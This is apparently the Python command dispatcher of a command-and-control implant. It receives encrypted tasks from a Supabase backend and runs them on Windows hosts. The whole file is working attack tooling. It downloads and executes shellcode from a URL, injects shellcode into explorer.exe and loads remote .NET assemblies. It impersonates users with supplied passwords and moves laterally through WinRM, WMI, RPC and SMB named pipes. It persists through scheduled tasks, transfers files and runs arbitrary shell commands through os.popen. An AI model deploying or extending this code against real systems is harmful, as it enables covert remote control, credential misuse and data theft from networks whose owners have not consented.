import os
import logging
import time
import shlex
from cryptography.fernet import Fernet, InvalidToken
from supabase import create_client
from .commands import update_command_status, fetch_pending_commands_for_agent
from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase, check_for_pending_downloads
from .system_info import get_system_info
from .config import supabase, PIPE_NAME_TEMPLATE
from .settings import fetch_settings
from utils.winapi.ad_health import handle_ad_health_command
import threading

# Conditional import based on the operating system
if os.name == 'nt':  # 'nt' indicates Windows
    from multiprocessing import Pipe
    import pywintypes
    import win32pipe
    import win32file
    from utils.winapi.ls import ls
    from utils.winapi.list_users_in_group import list_users_in_group
    from utils.winapi.smb_get import smb_get
    from utils.winapi.smb_write import smb_write
    from utils.winapi.winrm_execute import winrm_execute
    from utils.winapi.pwd import wpwd
    from utils.winapi.wami import wami
    from utils.winapi.ps import list_processes, grep_processes, terminate_process
    from utils.winapi.run import run_process
    from utils.winapi.netexec import load_dotnet_assembly
    from utils.winapi.hostname import get_hostname 
    from utils.winapi.nslookup import nslookup
    from utils.winapi.mkdir import mkdir
    from utils.winapi.mv import mv
    from utils.winapi.cp import cp
    from utils.winapi.rm import rm
    from utils.winapi.wmirun import wmirun
    from utils.winapi.user_info import get_user_info
    from utils.winapi.rpcrun import rpcrun
    from utils.winapi.inject_shellcode import load_shellcode_into_explorer
    from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
    from utils.winapi.cd import cd
    from utils.winapi.ipinfo import get_ip_info
    from utils.winapi.make_token import make_token, revert_to_self
    from utils.winapi.get_ad_domain import get_ad_domain
    from utils.winapi.get_domain_controllers import get_domain_controllers
    from utils.winapi.get_logged_on_users import get_logged_on_users
    from utils.winapi.get_drive_info import get_drive_info
    from utils.winapi.get_installed_programs import get_installed_programs
    from utils.winapi.list_scheduled_tasks import list_scheduled_tasks
    from utils.winapi.create_scheduled_task import create_scheduled_task
    from utils.winapi.delete_scheduled_task import delete_scheduled_task
    from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
    from utils.winapi.cat import cat
    from utils.winapi.start_scheduled_task import start_scheduled_task
    from utils.winapi.compress import start_compression_thread
    from utils.winapi.search_files import search as search_files

logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("supabase").setLevel(logging.WARNING)
logging.basicConfig(level=logging.WARNING)
smb_pipe_conn = None

def update_command_status_wrapper(command_id, status, output, agent_id, ip, os_info, username, encryption_key):
    encrypted_output = encrypt_response(output, encryption_key)
    update_command_status(command_id, status, encrypted_output, agent_id, ip, os_info, username)

def decrypt_command(encrypted_command, key):
    try:
        logging.debug(f"Decrypting command using key: {key}")
        cipher_suite = Fernet(key)
        decrypted_data = cipher_suite.decrypt(encrypted_command.encode()).decode()
        logging.debug(f"Decrypted command: {decrypted_data}")
        return decrypted_data
    except Exception as e:
        logging.error(f"Failed to decrypt command: {e}")
        return f"Failed to decrypt command: {e}"

def encrypt_response(response, key):
    try:
        logging.debug(f"Encrypting response using key: {key}")
        cipher_suite = Fernet(key)
        encrypted_response = cipher_suite.encrypt(response.encode()).decode()
        logging.debug(f"Encrypted response: {encrypted_response}")
        return encrypted_response
    except Exception as e:
        logging.error(f"Failed to encrypt response: {e}")
        return f"Failed to encrypt response: {e}"

def link_smb_agent(ip_address, username=None, password=None, domain=None):
    if os.name != 'nt':
        return "Link SMB agent is only supported on Windows."
    
    global smb_pipe_conn
    pipe_name = PIPE_NAME_TEMPLATE.format(ip_address=ip_address)
    try:
        smb_pipe_conn = win32file.CreateFile(
            pipe_name,
            win32file.GENERIC_READ | win32file.GENERIC_WRITE,
            0, None,
            win32file.OPEN_EXISTING,
            0, None
        )
        win32pipe.SetNamedPipeHandleState(smb_pipe_conn, win32pipe.PIPE_READMODE_MESSAGE, None, None)
        if username and password and domain:
            win32file.WriteFile(smb_pipe_conn, f'connect {username} {password} {domain}'.encode('utf-8'))
        elif username and password:
            win32file.WriteFile(smb_pipe_conn, f'connect {username} {password}'.encode('utf-8'))
        elif username:
            win32file.WriteFile(smb_pipe_conn, f'connect {username}'.encode('utf-8'))
        else:
            win32file.WriteFile(smb_pipe_conn, b'connect')
        return f"SMB agent linked successfully to {ip_address}."
    except pywintypes.error as e:
        smb_pipe_conn = None
        return f"Failed to link SMB agent: {e}"

def unlink_smb_agent(ip_address):
    if os.name != 'nt':
        return "Unlink SMB agent is only supported on Windows."
    
    global smb_pipe_conn
    try:
        if smb_pipe_conn:
            win32file.WriteFile(smb_pipe_conn, b'disconnect')
            win32file.CloseHandle(smb_pipe_conn)
            smb_pipe_conn = None
            return f"SMB agent unlinked successfully from {ip_address}."
        return f"SMB agent is not linked to {ip_address}."
    except pywintypes.error as e:
        return f"Failed to unlink SMB agent: {e}"

def send_command_to_smb_agent(command):
    if os.name != 'nt':
        return "Send command to SMB agent is only supported on Windows."
    
    global smb_pipe_conn
    if smb_pipe_conn:
        try:
            win32file.WriteFile(smb_pipe_conn, command.encode('utf-8'))
            result = win32file.ReadFile(smb_pipe_conn, 64 * 1024)
            hostname, output = result[1].decode('utf-8').split('\n', 1)
            return hostname, output
        except pywintypes.error as e:
            return None, f"Failed to communicate with SMB agent: {e}"
    return None, "SMB agent is not linked."

def handle_kill_command(command_id, command_text, agent_id):
    if command_text.strip().lower() == "kill":
        logging.debug("Kill command received. Updating status and preparing to exit agent.")
        try:
            response = supabase.table('py2').update({
                'status': 'Completed',
                'output': 'Agent terminated'
            }).eq('id', command_id).execute()

            if response.data:
                logging.debug("Command status updated successfully to 'Completed'.")
            else:
                logging.warning(f"Error updating command status: {response.json()}")

        except Exception as e:
            logging.error(f"Failed to update command status before termination: {e}")

        try:
            response = supabase.table('settings').update({
                'check_in': 'Dead'
            }).eq('agent_id', agent_id).execute()

            if response.data:
                logging.debug("Agent status updated successfully to 'Dead'.")
            else:
                logging.warning(f"Error updating agent status: {response.json()}")

        except Exception as e:
            logging.error(f"Failed to update agent status before termination: {e}")

        finally:
            logging.debug("Shutdown sequence initiated.")
            os._exit(0)

def execute_ad_health_async(command_parts, command_id, agent_id, ip, os_info, username, encryption_key):
    def run_ad_health():
        try:
            result = handle_ad_health_command(command_parts)
            status = 'Completed'
            output = result
        except Exception as e:
            status = 'Failed'
            output = str(e)
        
        encrypted_output = encrypt_response(output, encryption_key)
        update_command_status(command_id, status, encrypted_output, agent_id, ip, os_info, username)

    thread = threading.Thread(target=run_ad_health)
    thread.start()
    return "AD health check started. The results will be available once the operation completes."

def execute_commands(agent_id):
    hostname, ip, os_info = get_system_info()

    pending_uploads_response = fetch_pending_uploads()
    if pending_uploads_response.data:
        for upload in pending_uploads_response.data:
            file_url = upload.get('file_url')
            remote_path = upload.get('remote_path')
            if file_url and remote_path:
                if download_from_supabase(file_url, remote_path):
                    supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
                else:
                    supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()

    # Fetch pending downloads and handle them
    pending_downloads = check_for_pending_downloads(agent_id)
    if pending_downloads:
        for download in pending_downloads:
            command_text = f"download {download['local_path']}"
            username = download.get('username', 'Unknown')
            status, output = handle_download_command(command_text, username, agent_id, hostname)
            # Update the status in the downloads table instead of py2 table
            supabase.table("downloads").update({"status": status}).eq("id", download['id']).execute()

    pending_commands_response = fetch_pending_commands_for_agent(agent_id)
    logging.debug(f"Pending commands for agent_id {agent_id}: {pending_commands_response.data}")

    if pending_commands_response.data:
        _, _, encryption_key = fetch_settings(agent_id)  # Fetch the encryption key for command handling
        logging.debug(f"Fetched encryption key for agent_id {agent_id}: {encryption_key}")

        for command in pending_commands_response.data:
            command_id = command['id']
            encrypted_command_text = command.get('command', '')
            try:
                command_text = decrypt_command(encrypted_command_text, encryption_key)
                logging.debug(f"Decrypted command for command_id {command_id}: {command_text}")
            except Exception as e:
                logging.error(f"Failed to decrypt command {command_id}: {e}")
                update_command_status(command_id, 'Failed', f"Decryption error: {e}", agent_id, ip, os_info, 'Unknown')
                continue

            username = command.get('username', 'Unknown')

            if command_text.lower().startswith('kill'):
                handle_kill_command(command_id, command_text, agent_id)

            elif command_text.lower().startswith('link smb agent'):
                parts = command_text.split()
                ip_address = parts[3]
                username = parts[4] if len(parts) > 4 else None
                password = parts[5] if len(parts) > 5 else None
                domain = parts[6] if len(parts) > 6 else None
                result = link_smb_agent(ip_address, username, password, domain)
                update_command_status(command_id, 'Completed', encrypt_response(result, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower().startswith('unlink smb agent'):
                parts = command_text.split()
                ip_address = parts[3]
                result = unlink_smb_agent(ip_address)
                update_command_status(command_id, 'Completed', encrypt_response(result, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower().startswith('smb '):
                smb_command = command_text[4:]
                smbhost, result = send_command_to_smb_agent(smb_command)
                update_command_status(command_id, 'Completed', encrypt_response(result, encryption_key), agent_id, ip, os_info, username, smbhost)

            elif os.name == 'nt' and command_text.lower().startswith('ls'):
                try:
                    path = command_text.split(' ', 1)[1]
                    result = ls(path)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'get_dc_list':
                try:
                    result = get_domain_controllers()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.startswith('get_user_info'):
                try:
                    parts = command_text.split(' ', 2)
                    username = parts[1]
                    domain = parts[2] if len(parts) > 2 else None
                    result = get_user_info(username, domain)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('compress'):
                try:
                    file_path = command_text.split(' ', 1)[1]
                    compression_thread = start_compression_thread(
                        file_path, 
                        command_id, 
                        update_command_status_wrapper, 
                        agent_id, 
                        ip, 
                        os_info, 
                        username, 
                        encryption_key
                    )
                    status = 'Running'
                    output = f"Compression process started in the background for file: {file_path}"
                    update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                    update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('rm'):
                try:
                    path = command_text.split(' ', 1)[1]
                    result = rm(path)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('mkdir'):
                try:
                    path = command_text.split(' ', 1)[1]
                    result = mkdir(path)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('start_scheduled_task'):
                try:
                    parts = command_text.split(' ', 1)
                    if len(parts) != 2:
                        raise ValueError("Invalid command format. Use 'start_scheduled_task <task_name>'")
                    _, task_name = parts
                    result = start_scheduled_task(task_name)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('cat'):
                try:
                    file_path = command_text.split(' ', 1)[1]
                    result = cat(file_path)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'get_logged_on_users':
                try:
                    result = get_logged_on_users()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'get_ad_domain':
                try:
                    result = get_ad_domain()
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'get_installed_programs':
                try:
                    result = get_installed_programs()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'get_drive_info':
                try:
                    result = get_drive_info()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('make_token'):
                try:
                    parts = command_text.split()
                    username = parts[1]
                    password = parts[2]
                    domain = parts[3] if len(parts) > 3 else ''
                    result = make_token(username, password, domain)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = f"{str(e)}"
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'revert_to_self':
                try:
                    result = revert_to_self()
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = f"{str(e)}"
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('ipinfo'):
                try:
                    result = get_ip_info()
                    status = 'Completed'
                    output = "\n".join([str(entry) for entry in result])  # Convert list of dicts to string
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('cd'):
                try:
                    directory = command_text.split(' ', 1)[1]
                    result = cd(directory)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = f"{str(e)}"
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('execshellcode'):
                try:
                    file_url = command_text.split(' ', 1)[1]
                    result = load_shellcode_from_url(file_url)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = f"{str(e)}"
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('injectshellcode'):
                try:
                    file_path = command_text.split(' ', 1)[1]
                    result = load_shellcode_into_explorer(file_path)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('cp'):
                try:
                    parts = command_text.split(' ', 2)
                    if len(parts) < 3:
                        raise ValueError("Invalid cp command format. Use 'cp <source> <destination>'.")
                    src, dst = parts[1], parts[2]
                    result = cp(src, dst)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('search'):
                try:
                    result = search_files()
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'ps':
                try:
                    result = list_processes()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('ps grep'):
                try:
                    pattern = command_text.split(' ', 2)[2]
                    result = grep_processes(pattern)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('ps term'):
                try:
                    process_id = int(command_text.split(' ', 2)[2])
                    result = terminate_process(process_id)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('run'):
                try:
                    executable_path = command_text.split(' ', 1)[1]
                    result = run_process(executable_path)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower() == 'whoami':
                if os.name == 'nt':
                    try:
                        result = wami()
                        status = 'Completed'
                        output = "\n".join(result)
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                else:
                    try:
                        result = os.popen('whoami').read()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                encrypted_output = encrypt_response(output, encryption_key)
                update_command_status(command_id, status, encrypted_output, agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('mv'):
                try:
                    parts = command_text.split(' ', 2)
                    if len(parts) < 3:
                        raise ValueError("Invalid mv command format. Use 'mv <source> <destination>'.")
                    src, dst = parts[1], parts[2]
                    result = mv(src, dst)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)    

            elif os.name == 'nt' and command_text.lower().startswith('users '):
                try:
                    parts = command_text.split(' ', 2)
                    if len(parts) < 3:
                        raise ValueError("Invalid users command format. Use 'users <local|dom> <group_name>'.")
                    group_type, group_name = parts[1], parts[2]
                    result = list_users_in_group(group_type, group_name)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower() == 'list_scheduled_tasks':
                try:
                    result = list_scheduled_tasks()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('create_scheduled_task'):
                try:
                    parts = shlex.split(command_text, posix=False)
                    if len(parts) < 4 or len(parts) > 6:
                        raise ValueError("Invalid command format. Use 'create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration]'")
                    
                    task_name = parts[1]
                    command_line = parts[2].strip('"')
                    trigger_time = parts[3]
                    repeat_interval = parts[4] if len(parts) >= 5 else None
                    repeat_duration = parts[5] if len(parts) == 6 else None
                    
                    result = create_scheduled_task(task_name, command_line, trigger_time, repeat_interval, repeat_duration)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('delete_scheduled_task'):
                try:
                    parts = command_text.split(' ', 1)
                    if len(parts) != 2:
                        raise ValueError("Invalid command format. Use 'delete_scheduled_task <task_name>'")
                    _, task_name = parts
                    result = delete_scheduled_task(task_name)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('get_scheduled_task_info'):
                try:
                    parts = command_text.split(' ', 1)
                    if len(parts) != 2:
                        raise ValueError("Invalid command format. Use 'get_scheduled_task_info <task_name>'")
                    _, task_name = parts
                    result = get_scheduled_task_info(task_name)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('writesmb '):
                parts = command_text.split(' ')
                if len(parts) < 3:
                    status = 'Failed'
                    output = "Invalid writesmb command format. Use 'writesmb <local_file_path> <remote_smb_path> [username password domain]'."
                else:
                    try:
                        local_file_path = parts[1]
                        remote_smb_path = parts[2]
                        if len(parts) == 6:
                            username, password, domain = parts[3], parts[4], parts[5]
                            result = smb_write(local_file_path, remote_smb_path, username, password, domain)
                        else:
                            result = smb_write(local_file_path, remote_smb_path)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('getsmb '):
                parts = command_text.split(' ')
                if len(parts) < 3:
                    status = 'Failed'
                    output = "Invalid getsmb command format. Use 'getsmb <remote_file_path> <local_file_path> [username password domain]'."
                else:
                    try:
                        remote_file_path = parts[1]
                        local_file_path = parts[2]
                        if len(parts) == 6:
                            username, password, domain = parts[3], parts[4], parts[5]
                            result = smb_get(remote_file_path, local_file_path, username, password, domain)
                        else:
                            result = smb_get(remote_file_path, local_file_path)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('winrmexec '):
                parts = command_text.split(' ')
                if len(parts) < 3:
                    status = 'Failed'
                    output = "Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'."
                else:
                    try:
                        remote_host = parts[1]
                        command = parts[2]
                        if len(parts) == 6:
                            username, password, domain = parts[3], parts[4], parts[5]
                            result = winrm_execute(remote_host, command, username, password, domain)
                        else:
                            result = winrm_execute(remote_host, command)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            # Insert this snippet in the appropriate section of the execute_commands function
            elif os.name == 'nt' and command_text.lower().startswith('wmirun'):
                try:
                    parts = command_text.split(' ', 5)
                    if len(parts) < 3:
                        raise ValueError("Invalid wmirun command format. Use 'wmirun <hostname> <command> [user] [password] [domain]'")

                    remote_hostname = parts[1]
                    command = parts[2]
                    user = parts[3] if len(parts) > 3 else None
                    password = parts[4] if len(parts) > 4 else None
                    domain = parts[5] if len(parts) > 5 else None

                    result = wmirun(remote_hostname, command, user, password, domain)
                    status = 'Completed' if "Process started successfully" in result else 'Failed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif os.name == 'nt' and command_text.lower().startswith('rpcrun'):
                try:
                    parts = command_text.split(' ', 4)
                    if len(parts) < 3:
                        raise ValueError("Invalid rpcrun command format. Use 'rpcrun <hostname> <command> [user password]'")

                    remote_hostname = parts[1]
                    command = parts[2]
                    user = parts[3] if len(parts) > 3 else None
                    password = parts[4] if len(parts) > 4 else None

                    # Note: Domain is already included in the user if provided on the client side
                    result = rpcrun(remote_hostname, command, user, password)
                    status = 'Completed' if "Process started successfully" in result else 'Failed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower() == 'pwd':
                if os.name == 'nt':
                    try:
                        result = wpwd()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                else:
                    try:
                        result = os.popen('pwd').read()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower().startswith('download'):
                # Handle download command without updating the py2 table
                status, output = handle_download_command(command_text, username, agent_id, hostname)

            elif command_text.lower().startswith('upload'):
                # Handle upload command as usual
                status, output = handle_upload_command(command_text, username, agent_id)

            elif command_text.lower().startswith("netexec "):
                try:
                    _, file_url, *arguments = command_text.split(maxsplit=2)
                    arguments = " ".join(arguments)
                    output, error = load_dotnet_assembly(file_url, arguments)
                    status = "Completed" if not error else "Failed"
                    output = output if not error else f"{output}\n{error}"
                except Exception as e:
                    status = "Failed"
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower() == 'hostname':
                if os.name == 'nt':
                    try:
                        result = get_hostname()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            elif command_text.lower().startswith('nslookup'):
                if os.name == 'nt':
                    try:
                        host_to_lookup = command_text.split(' ', 1)[1]
                        result = nslookup(host_to_lookup)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            # Add this block to handle the ad_health command
            elif command_text.lower().startswith('ad_health'):
                try:
                    command_parts = command_text.split()
                    result = execute_ad_health_async(command_parts, command_id, agent_id, ip, os_info, username, encryption_key)
                    status = 'Running'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
            elif command_text.lower().startswith('ad_health'):
                try:
                    command_parts = command_text.split()
                    result = execute_ad_health_async(command_parts, command_id, agent_id, ip, os_info, username, encryption_key)
                    status = 'Running'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

            else:
                try:
                    result = os.popen(command_text).read()
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)

    else:
        logging.debug("No pending commands found.")

    # Check for pending downloads and handle them
    pending_downloads = check_for_pending_downloads(agent_id)
    if pending_downloads:
        for download in pending_downloads:
            command_text = f"download {download['local_path']}"
            username = download.get('username', 'Unknown')
            status, output = handle_download_command(command_text, username, agent_id, hostname)
            # Update the downloads table instead of py2 table
            supabase.table("downloads").update({"status": status}).eq("id", download['id']).execute()